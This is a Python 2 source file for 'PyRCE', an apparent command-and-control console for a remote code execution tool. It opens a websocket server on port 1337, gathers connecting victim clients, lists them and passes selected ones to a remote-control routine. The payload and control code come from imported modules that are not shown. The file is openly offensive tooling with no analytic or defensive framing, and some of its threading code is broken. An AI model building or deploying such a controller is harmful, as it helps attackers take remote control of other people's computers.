# -*- coding: utf-8 -*-


import signal
import sys
import threading
from sockets import WebsocketServer


from printer import Printer

if __name__ == "__main__":

    try:
        server = WebsocketServer("0.0.0.0", 1337)
        global listener_thread
        p = Printer()
        print "PyRCE - Commands: listen, list, control"
        while True:
            cmd = raw_input('>')
            if cmd == "listen":
                listener_thread = threading.Thread(target=server.listen(persist=True))
                listener_thread.start()
            if cmd == "stop":
                listener_thread.stop()
            if cmd == "list":
                if server.CLIENTS == []:
                    p.info("There are no clients connected. Use 'listen' to collect clients.")
                else:
                    for i,c in enumerate(server.CLIENTS):
                        print "{}. {}".format(i+1, c['addr'])
            if cmd == "control":
                p.prompt("Which clients? (1 2 ...)")
                for i,c in enumerate(server.CLIENTS):
                    print "{}. {}".format(i+1, c['addr'])

                cmd = raw_input()

                # client_socket = None
                try:
                    indices = [int(i) for i in cmd.split(' ')]
                    sockets = []
                    for i,c in enumerate(server.CLIENTS):
                        if i + 1 in indices:
                            sockets.append(c)
                    server.control_clients(sockets)
                # except IOError as e:
                #     print "[!!]  Unable to connect to client."
                #     print "[!!]  Removing client from list."
                #     server.CLIENTS.remove(client_socket)
                except Exception as e:
                    p.error("Unable to use these clients.")
                    p.error(str(e))


    except KeyboardInterrupt:
        p.info("Closing connection...")
        server.server.close()
